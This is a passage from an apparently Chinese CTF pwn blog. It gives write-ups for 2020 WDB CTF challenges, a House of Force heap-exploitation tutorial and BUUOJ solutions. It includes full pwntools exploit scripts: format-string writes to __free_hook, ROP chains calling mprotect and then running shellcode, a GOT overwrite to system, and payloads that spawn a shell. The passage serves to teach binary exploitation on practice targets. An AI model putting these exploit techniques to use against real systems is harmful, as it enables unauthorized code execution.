<span class="number">0xE8</span></span><br><span class="line"><span class="comment"># libc中 one_gadget 与 __libc_start_main_ret 的相对偏移</span></span><br><span class="line">libc_offset = <span class="number">0x4f2c5</span> - <span class="number">0x021b97</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="comment"># pop一个值出来，使得$sp指针刚好指向environ地址所在的内存</span></span><br><span class="line">payload += flat(<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 将栈偏移赋值到$ax</span></span><br><span class="line">payload += flat(<span class="number">1</span>, stack_offset)</span><br><span class="line"><span class="comment"># 弹出environ地址，将$ax的值与该栈地址相减，并将结果赋值到$ax上</span></span><br><span class="line">payload += flat(<span class="number">26</span>)</span><br><span class="line"><span class="comment"># 将$ax的值重新压入虚拟栈中</span></span><br><span class="line">payload += flat(<span class="number">13</span>)</span><br><span class="line"><span class="comment"># 解引用$ax，取出__libc_start_main_ret的libc地址，结果放置在$ax</span></span><br><span class="line">payload += flat(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 将$ax的值重新压入虚拟栈中</span></span><br><span class="line">payload += flat(<span class="number">13</span>)</span><br><span class="line"><span class="comment"># 将libc偏移赋值到$ax</span></span><br><span class="line">payload += flat(<span class="number">1</span>, libc_offset)</span><br><span class="line"><span class="comment"># 弹出__libc_start_main_ret的libc地址，将$ax的值与该地址相加得到one_gadget地址，并将结果赋值到$ax上</span></span><br><span class="line">payload += flat(<span class="number">25</span>)</span><br><span class="line"><span class="comment"># 弹出__libc_start_main_ret的栈地址，并向该栈地址写入$ax(&amp;one_gadget)</span></span><br><span class="line">payload += flat(<span class="number">11</span>)</span><br><span class="line"><span class="comment"># 退出程序</span></span><br><span class="line">payload += flat(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">debug(<span class="string">"b * $rebase(0xA4A)"</span>)</span><br><span class="line">io.sendafter(<span class="string">"Input your code&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="3-faster0">3. faster0</h3>
<p>点击<a href="/2020/05/2020wdbctf/faster" title="这里">这里</a>下载文件</p>
<h4 id="1-易知信息-3">1) 易知信息</h4>
<ul>
<li>由于赛后复盘时间较晚，无法连接远程，故初始的hash爆破的复盘只能搁置</li>
<li>保护只开了partial RELRO和NX</li>
<li>程序在read一串长字符串后，必须通过100个func函数，才能执行到一个最终带有栈溢出漏洞的函数func100</li>
</ul>
<h4 id="2-分析-3">2) 分析</h4>
<ul>
<li>这里第一时间就想到了爆破，最大爆破次数100 * 10 == 1000次。程序在本地执行的很快，不需要花太久时间<br>
在本地试着爆破了一下，发现速度还挺快<br>
<img src="/2020/05/2020wdbctf/faster_bruteForce.png" alt="img"></li>
<li>爆破出路径后，程序就可以进行栈溢出了。在程序中有read有write，无论是泄露libc版本打patch还是直接DynELF都可以，就不再赘述了</li>
</ul>
<h4 id="3-爆破脚本">3) 爆破脚本</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(tmpPwd)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times, password</span><br><span class="line">    times += <span class="number">1</span></span><br><span class="line">    result = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    io = process(<span class="string">'faster0'</span>)</span><br><span class="line">    log.info(<span class="string">"try passwd: "</span> + str(times) + <span class="string">": "</span> + tmpPwd)</span><br><span class="line">    io.send(tmpPwd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recv(timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        result = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">startTime = time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        ch = str(val)</span><br><span class="line">        <span class="keyword">if</span> round(password + ch):</span><br><span class="line">            password += ch</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">endTime = time.time()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'-'</span>*<span class="number">120</span> + <span class="string">"\n"</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'Password: '</span> + password)</span><br><span class="line">log.success(<span class="string">"RoundTimes: "</span> + str(times))</span><br><span class="line">log.success(<span class="string">"Time: "</span> + str(endTime - startTime))</span><br></pre></td></tr></table></figure>
<h2 id="2-白虎组">2.白虎组</h2>
<h3 id="1-of">1. of</h3>
<p>点击<a href="/2020/05/2020wdbctf/of" title="这里">这里</a>下载文件</p>
<ul>
<li>一道非常非常基础的gets栈溢出</li>
<li>EXP略</li>
</ul>
<h3 id="2-quantum-entanglement">2. quantum_entanglement</h3>
<p>点击<a href="/2020/05/2020wdbctf/quantum_entanglement" title="这里">这里</a>下载文件</p>
<h4 id="1-分析">1) 分析</h4>
<ul>
<li>
<p>程序会生成两个随机数，并将这两个数放置在栈上。同时，程序还会将某个随机数的栈地址后2字节放置在栈上<br>
<img src="/2020/05/2020wdbctf/quantum_entanglement_maincode.png" alt="img"><br>
在执行<code>log_in</code>函数之后，判断栈上两个随机数是否相同，如果相同则get shell。</p>
</li>
<li>
<p><code>log_in</code>函数存在格式化字符串漏洞<br>
<img src="/2020/05/2020wdbctf/quantum_entanglement_printf.png" alt="img"></p>
<blockquote>
<p>这个漏洞函数有点坑，故意设置arg2为<code>%s</code>。 如果审计伪代码时速度稍微快了一点，说不定就审不出来了 :-)</p>
</blockquote>
</li>
<li>
<p>既然我们要通过格式化字符串漏洞来pass后面的随机数比较，那么我们就先看看栈上的数据<br>
<img src="/2020/05/2020wdbctf/quantum_entanglement_stack1.png" alt="img"><br>
我们希望将这半截地址写到栈上存储的某个栈地址上，从而在栈上构造随机数1的栈地址。之后便可以通过该地址来修改上面的随机数。</p>
<blockquote>
<p>一个小例子:</p>
<ul>
<li>假设rand1的栈地址为<code>0xFFFF1111</code>， 栈上已经存放了其半截地址 <code>0x1111</code></li>
<li>在栈上找到一个地址<code>0xFFFF2222</code>，该地址上存放着一个栈地址<code>0xFFFF3333</code> ([<code>0xFFFF2222</code>] = <code>0xFFFF3333</code>)。同时地址<code>0xFFFF3333</code>上存放着另一个栈地址<code>0xFFFF4444</code>([<code>0xFFFF3333</code>] = <code>0xFFFF4444</code>)</li>
<li>通过指针<code>0xFFFF2222</code>，向地址<code>0xFFFF333</code>写入两字节<code>0x1111</code>，使得[<code>0xFFFF333</code>] = <code>0xFFFF1111</code></li>
<li>现在，栈上已经存放了指针<code>0xFFFF1111</code>。之后我们就可以通过格式化字符串漏洞修改地址<code>0xFFFF1111</code>上的值</li>
</ul>
</blockquote>
</li>
<li>
<p>我们可以在栈的底部找到所需的<code>栈1-&gt;栈2-&gt;栈3</code>链<br>
<img src="/2020/05/2020wdbctf/quantum_entanglement_stack2.png" alt="img"></p>
</li>
<li>
<p><strong>关键点</strong>：利用格式化字符串 <code>%*A$c%B$hn</code> , 我们可以将argA上的两字节移动到argB指向的内存上</p>
<blockquote>
<p>argA、argB为printf的参数A、参数B。参数0为格式化字符串地址<br>
<code>%*A$c</code> 的效果与 <code>%[argA]c</code> 相同。都是输出argA个字符。<br>
例子：<code>%*12$c%22$hn</code> , 将printf参数12的两字节，写入到参数22指向的内存中</p>
</blockquote>
</li>
<li>
<p>在计算出相对偏移后，将随机数rand1的半截地址写入<code>栈1-&gt;栈2-&gt;栈3</code>指针链中的<code>栈2</code>，从而使<code>栈2</code>指向<code>rand1</code>。</p>
<blockquote>
<p><code>栈1</code>-&gt;<code>栈2</code>-&gt;<code>rand1</code></p>
</blockquote>
<p>然后我们就可以通过<code>栈2</code>，修改<code>rand1</code>的值为<code>rand2</code>的值了。</p>
</li>
<li>
<p>最后，通过<code>rand1 != rand2</code>的判断，get shell。</p>
</li>
</ul>
<h4 id="2-EXP">2) EXP</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%*19$c%52$hn</span><br><span class="line">%*18$c%116$n</span><br></pre></td></tr></table></figure>
<h2 id="3-朱雀组">3. 朱雀组</h2>
<h3 id="1-魔法房间">1. 魔法房间</h3>
<p>点击<a href="/2020/05/2020wdbctf/magicRoom" title="这里">这里</a>下载文件</p>
<ul>
<li>一道基础的UAF漏洞，自带后门函数</li>
<li>无论是利用方式还是所使用的数据结构，该程序都和pwnable.tw里的hacknote题高度相同</li>
<li>EXP略</li>
</ul>
<h3 id="2-云盾">2. 云盾</h3>
<p>点击<a href="/2020/05/2020wdbctf/%E4%BA%91%E7%9B%BE" title="这里">这里</a>下载文件</p>
<h4 id="1-易知信息-4">1) 易知信息</h4>
<ul>
<li>程序提供了以下几条命令
<ol>
<li><code>ls</code> - 输出 ‘flag pwn 1 2’</li>
<li>vim系列
<ol>
<li><code>vim 1</code> - 向一块malloc出的地址(buf1) 写入数据</li>
<li><code>vim 2</code> - 向另一块malloc出的地址(buf2) 写入数据</li>
</ol>
</li>
<li>rm系列
<ol>
<li><code>rm 1</code> - 将buf1释放，free后没有重置buf1指针</li>
<li><code>rm 2</code> - 将buf2释放，free后没有重置buf2指针</li>
</ol>
</li>
<li>cat系列
<ol>
<li><code>cat 1</code> - 调用<code>puts</code>函数输出</li>
<li><code>cat 2</code> - 调用<code>printf</code>函数输出。<strong>注意，存在格式化字符串漏洞</strong></li>
</ol>
</li>
<li><code>ls</code> - 修改某个字符串为传入的“文件夹”名称</li>
</ol>
</li>
</ul>
<h4 id="2-分析-4">2) 分析</h4>
<ul>
<li>尽管程序free一块内存后没有将对应指针置为NULL，但此漏洞在这里无法利用</li>
<li>程序中较为频繁的使用<code>strcpy</code>危险函数，但输入长度已被限制，无法通过该函数进行溢出</li>
<li>程序在free内存前，会进行内存检查。查看当前chunk的PREV_SIZE是否为NULL。如果不是，则程序判定为内存泄露，进行相应的修复操作</li>
<li>程序在格式化字符串漏洞前，进行了传入字符串的相关检查。判断字符串中是否出现<code>%n</code>、<code>%h</code>、<code>%x</code>。若出现，则程序判定为攻击，不执行printf函数
<blockquote>
<p>这个字符串的检查相当的鸡肋，原因是在该漏洞的利用中，百分号后面大概率紧跟着数字。例如 <strong>%16hhn</strong>`</p>
</blockquote>
</li>
<li>根据以上信息，我们可以尝试通过格式化字符串，将<code>__free_hook</code>改为<code>system</code>地址，并通过执行<code>free(&quot;/bin/sh&quot;)</code>来获取shell.
<ol>
<li>我们可以通过格式化字符串，泄露<code>__libc_start_main_ret</code>地址，得到libc的版本，并进一步计算<code>system</code>地址和<code>__free_hook</code>地址。为接下来的操作做准备。</li>
<li>由于输入的字符串在堆上，故没办法通过 <em>输入字符串里的地址</em> 来定向修改数据<br>
但通过观察栈上数据，我们可以发现，输入的命令存放在栈上<br>
<img src="/2020/05/2020wdbctf/cloudProtect_stack.png" alt="img"><br>
所以我们可以在该命令后面加上__free_hook的地址，来定向修改__free_hook<br>
<img src="/2020/05/2020wdbctf/cloudProtect_stack_freeHook.png" alt="img"></li>
<li>由于该程序中指针占用八个字节，如果直接修改数据，势必会输出大量无用信息（大约几个G左右）<br>
所以需要分批修改。每次使用<code>%11hhn</code>修改一个字节，修改6次即可完成目标。<br>
当然，__free_hook的地址也要加上对应的偏移<br>
<img src="/2020/05/2020wdbctf/cloudProtect_stack_freeHook_offset.png" alt="img"></li>
</ol>
</li>
</ul>
<h4 id="3-EXP-2">3) EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./cloudProtect"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(payload, addr=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"vim 2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"cat 2"</span> + cyclic(<span class="number">3</span>) + p64(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">gdb.attach(io, <span class="string">"b* $rebase(0xFB5)"</span>)</span><br><span class="line">fmt(<span class="string">"%35$p\n"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = int(io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].replace(<span class="string">"&gt; "</span>, <span class="string">""</span>), <span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'__libc_start_main_ret'</span>, libc_start_main_ret)</span><br><span class="line">libc_base = libc_start_main_ret - obj.dump(<span class="string">'__libc_start_main_ret'</span>)</span><br><span class="line">log.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + obj.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify free_hook</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    fmt(<span class="string">"%&#123;&#125;c%11$hhn"</span>.format(u8(p64(system_addr)[i])), free_hook + i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getShell</span></span><br><span class="line">fmt(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"rm 2"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 14 - house漏洞</title>
    <url>/2020/05/heap-14-house/</url>
    <content><![CDATA[<h2 id="1-House-Of-Force">1. House Of Force</h2>
<h3 id="1-介绍">1) 介绍</h3>
<blockquote>
<p>以下部分介绍来自CTF wiki</p>
</blockquote>
<ul>
<li>House Of Force 产生的原因在于 glibc 对 top chunk 的处理。进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li>
<li>当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时，我们就可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。</li>
<li>然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证。
<ul>
<li>top chunk的大小必须足够大，否则申请一块超大内存时，程序会调用mmap而不是切割top chunk。<br>
这使得我们必须通过堆溢出，将top chunk的size改大。通常将其size改为<code>-1</code>。<br>
因为有符号整数<code>-1</code>，刚好是最大的无符号整数。</li>
<li>malloc的大小必须小于<code>-2*MINSIZE</code>（在64位机器上为<code>-0x40</code>）
<blockquote>
<p>为什么？ 请在<a href="/2020/04/heap-5-heap_definitions/">heap相关宏定义</a>中，查阅<code>checked_request2size(req, sz)</code>宏定义。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li>利用方法
<ul>
<li>在修改top chunk的size为(unsigned)-1后，我们需要计算目标地址与top chunk的相对偏移量<br>
<code>(offset = target_addr - top_chunk_addr + chunk_head_size + [chunk_align])</code></li>
<li>确定好相对偏移量后，<code>malloc(-offset)</code>就可以将top chunk迁移到目标地址。<br>
下一次malloc就会切割top chunk，并分配目标地址
<blockquote>
<p>为什么malloc的大小是<code>-offset</code>呢？这就涉及到无符号整数的计算了。<br>
<code>top_chunk_addr + (unsigned)(-offset)</code>，其计算结果由于最高位溢出，会刚好等于<code>target_addr</code></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>以上的偏移量计算方式是假定目标地址比堆的地址要低。但实际上，如果目标地址比堆的地址要高，则上述计算方式依然成立。</p>
</blockquote>
<ul>
<li>若目标地址同样在堆上，则相对偏移始终不变<br>
但如果目标地址不在堆上，例如ELF.bss段，则必须尝试 <strong>泄露堆地址</strong>，之后才能利用House Of Force</li>
</ul>
</li>
<li>利用条件
<ul>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li><strong>能够自由地控制堆分配尺寸的大小</strong></li>
<li>可计算top chunk与目标地址之间的偏移量</li>
</ul>
</li>
</ul>
<h3 id="2-例题-——-hitcontraining-bamboobox">2) 例题 —— hitcontraining_bamboobox</h3>
<h4 id="a-易知信息">a. 易知信息</h4>
<ul>
<li>关闭了PIE</li>
<li>add_item函数，对malloc的大小没有做限制。</li>
<li>change_item函数，有堆溢出漏洞</li>
<li>存在后门函数<code>magic</code>，输出<code>/home/bamboobox/flag</code></li>
</ul>
<blockquote>
<p>虽然存在后门函数，但BUUOJ几乎从不复现环境。所以House Of Force是得不到flag的。</p>
</blockquote>
<h4 id="b-分析">b. 分析</h4>
<ul>
<li>程序在main函数开始时，malloc了一块用于存放<code>hello_message</code>和<code>goodbye_message</code>函数指针的chunk</li>
<li>我们可以利用House Of Force，申请到那一块chunk，修改上面的函数指针为<code>magic</code>，进而在退出时执行<code>magic</code>函数</li>
</ul>
<h4 id="c-EXP">c. EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./bamboobox"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">""</span>)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"Please enter the length of item name:"</span>, str(size))</span><br><span class="line">    sla(<span class="string">"Please enter the name of item:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">"Please enter the index of item:"</span>, str(index))</span><br><span class="line">    sla(<span class="string">"Please enter the length of item name:"</span>, str(len(content)))</span><br><span class="line">    sla(<span class="string">"Please enter the new name of the item:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line">    sla(<span class="string">"Please enter the index of item:"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice:"</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 0</span></span><br><span class="line">change(<span class="number">0</span>, flat(cyclic(<span class="number">0x28</span>), <span class="number">-1</span>))</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">-0x60</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">change(<span class="number">2</span>, flat(cyclic(<span class="number">0x8</span>), e.symbols[<span class="string">'magic'</span>]))</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ 部分pwn题解</title>
    <url>/2020/05/buuoj-pwn/</url>
    <content><![CDATA[<p>此处会收录笔者做题中遇到的一些有趣的题</p>
<blockquote>
<p>被用于其他博客例题的题目将不会在此重复收录</p>
</blockquote>
<h2 id="1-inndy-rop">1. inndy_rop</h2>
<h3 id="分析">分析</h3>
<ul>
<li>一个静态编译的简单栈溢出</li>
<li>方法很多，可以用ROPgadget构建ROPchain，从而getshell。但该方法较为复杂</li>
<li>也可以先调用mprotect，将data段的权限变为RWX，写入shellcode并执行。该方法较为简单</li>
<li>可以使用pwntools里自带的ROP模块，事半功倍</li>
</ul>
<blockquote>
<p>mprotect函数，妙用多多</p>
</blockquote>
<a id="more"></a>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./rop"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于程序是gets读取，可能会发生\x0a截断，故不能使用包含\x0a的ROP链</span></span><br><span class="line">rop = ROP(e, badchars=<span class="string">'\x0a'</span>)</span><br><span class="line">rop.raw(cyclic(<span class="number">0x10</span>))</span><br><span class="line">rop.mprotect(<span class="number">0x080EA000</span>, <span class="number">0x1000</span>, <span class="number">7</span>)</span><br><span class="line">rop.read(<span class="number">0</span>, <span class="number">0x80EAF80</span>, <span class="number">0x100</span>)</span><br><span class="line">rop.call(<span class="number">0x80EAF80</span> + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sl(rop.chain())</span><br><span class="line">sl(cyclic(<span class="number">8</span>) + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2-BJDCTF-2nd-secret">2. [BJDCTF 2nd]secret</h2>
<h3 id="分析-2">分析</h3>
<ul>
<li>在输入name的函数中有个溢出点<br>
<img src="/2020/05/buuoj-pwn/secret_welcome.png" alt="img"><br>
并且刚好只能溢出到 gameTimes（猜数计数器的指针）<br>
<img src="/2020/05/buuoj-pwn/secret_overflow.png" alt="img"></li>
<li>发现每次输入secret时，gameTimes所指向的位置都会减一<br>
<img src="/2020/05/buuoj-pwn/secret_gameTimedec.png" alt="img"></li>
<li>程序结束部分会调用一次printf函数，并且printf函数至始至终只被调用了一次</li>
<li>查看程序尚未延迟绑定时的GOT表，发现got[‘system’]指向的plt表位置，比got[‘printf’]指向的位置要低，并且只低了0x10字节<br>
<img src="/2020/05/buuoj-pwn/secret_got.png" alt="img"></li>
<li>所以我们可以通过输入name函数的溢出漏洞，修改gameTimes，使其指向got[‘printf’]。然后进行0x10次猜数，使got[‘printf’]减去0x10，指向plt[‘system’]<br>
并在第十次猜数时故意失败，从而执行system(buf), 进行任意命令执行</li>
</ul>
<blockquote>
<p>printf(buf) 可不只是格式化字符串漏洞。将got[‘printf’]修改为plt[‘system’]后，也可以RCE</p>
</blockquote>
<h3 id="EXP-2">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./secret"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">e = ELF(ELFname)</span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">"What's your name?"</span>, flat(<span class="string">'/bin/sh\x00'</span>, <span class="number">0</span>, e.got[<span class="string">'printf'</span>])[:<span class="number">-5</span>])</span><br><span class="line"></span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x476B</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x2D38</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x4540</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x3E77</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x3162</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x3F7D</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x357A</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x3CF5</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x2F9E</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x41EA</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x48D8</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x2763</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x474C</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x3809</span>))</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x2E63</span>))</span><br><span class="line">debug(<span class="string">"hex 0x46D080"</span>)</span><br><span class="line">sla(<span class="string">"Secret:"</span>, str(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="3-ciscn-2019-n-5">3. ciscn_2019_n_5</h2>
<h3 id="分析-3">分析</h3>
<ul>
<li>NX关闭，很明显的一个读取并执行shellcode的题目</li>
<li>但这题有趣在：当NX关闭后，<strong>其bss段是可执行的</strong><br>
粗略观察了一下内存布局，发现只要关闭了NX，<strong>所有可读可写的段</strong> 都是可执行的<br>
以后要是有机会还是得研究一下NX的实现<br>
<img src="/2020/05/buuoj-pwn/ciscn_2019_n_5_vmmap.png" alt="img"></li>
</ul>
<h3 id="EXP-3">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ciscn_2019_n_5"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'tell me your name'</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">payload = flat(cyclic(<span class="number">0x28</span>), <span class="number">0x601080</span>)</span><br><span class="line">io.recvuntil(<span class="string">'What do you want to say to me?'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="4-ciscn-s-3">4. ciscn_s_3</h2>
<h3 id="易知信息">易知信息</h3>
<ul>
